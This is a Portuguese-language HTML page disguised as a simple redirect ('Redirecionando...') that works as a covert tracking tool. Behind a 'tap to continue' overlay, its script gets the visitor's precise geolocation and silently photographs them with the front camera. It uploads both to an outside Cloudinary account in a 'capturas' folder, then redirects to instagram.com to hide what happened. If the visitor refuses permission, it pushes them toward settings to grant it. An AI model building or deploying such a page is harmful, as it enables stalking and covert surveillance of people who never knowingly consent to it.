<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      display: none; justify-content: center; align-items: center;
      background: rgba(255,255,255,0.9);
      font-family: sans-serif; font-size: 20px; color: #333;
      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = 'dx5legahb';
    const uploadPreset = 'upload';
    const folderName = 'capturas';
    const overlay = document.getElementById('overlay');
    const geoOpts = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };

    function showOverlay(msg, handler) {
      overlay.textContent = msg;
      overlay.style.display = 'flex';
      overlay.onclick = handler;
    }
    function hideOverlay() {
      overlay.style.display = 'none';
    }

    // Redireciona para as configurações de permissão do app
    function openAppSettings() {
      const ua = navigator.userAgent;
      if (/iP(hone|od|ad)/.test(ua)) {
        // iOS: redireciona para as Preferências de Privacidade
        window.location.href = 'App-Prefs:root=Privacy&path=LOCATION';
      } else if (/Android/.test(ua)) {
        // Android: abre detalhes do app
        const pkg = window.location.host;
        window.location.href = `intent://#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;scheme=package;package=${pkg};end`;
      } else {
        alert('Abra as configurações do navegador para permitir localização.');
      }
    }

    // Etapa 1: solicitar permissão de localização
    function askLocation() {
      hideOverlay();
      navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, geoOpts);
    }
    function onGeoError(error) {
      console.warn('Geolocation error:', error);
      // só aparece ao negar ou erro
      showOverlay('Toque para permitir localização (vá para configurações)', openAppSettings);
    }
    function onGeoSuccess(pos) {
      hideOverlay();
      // upload localização
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
      const form = new FormData();
      form.append('file', blob, `localizacao_${Date.now()}.txt`);
      form.append('upload_preset', uploadPreset);
      form.append('folder', folderName);
      fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form })
        .then(() => {
          // solicitar câmera
          askCamera();
        })
        .catch(e => {
          console.error(e);
          showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
        });
    }

    // Etapa 2: solicitar permissão de câmera via sistema
    function askCamera() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(stream => {
          hideOverlay();
          const video = document.createElement('video');
          video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
          video.srcObject = stream;
          video.onloadedmetadata = () => video.play();
          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(t => t.stop());
            canvas.toBlob(blob => {
              const imgForm = new FormData();
              imgForm.append('file', blob);
              imgForm.append('upload_preset', uploadPreset);
              imgForm.append('folder', folderName);
              fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm })
                .then(() => window.location.href = 'https://instagram.com')
                .catch(() => showOverlay('Erro ao enviar foto. Toque para tentar novamente.', askCamera));
            }, 'image/png');
          }, 500);
        })
        .catch(error => {
          console.warn('Camera error:', error);
          showOverlay('Toque para permitir câmera (vá para configurações)', openAppSettings);
        });
    }

    // Inicialização
    window.addEventListener('DOMContentLoaded', () => {
      showOverlay('Toque para continuar', askLocation);
    });
  </script>
</body>
</html>
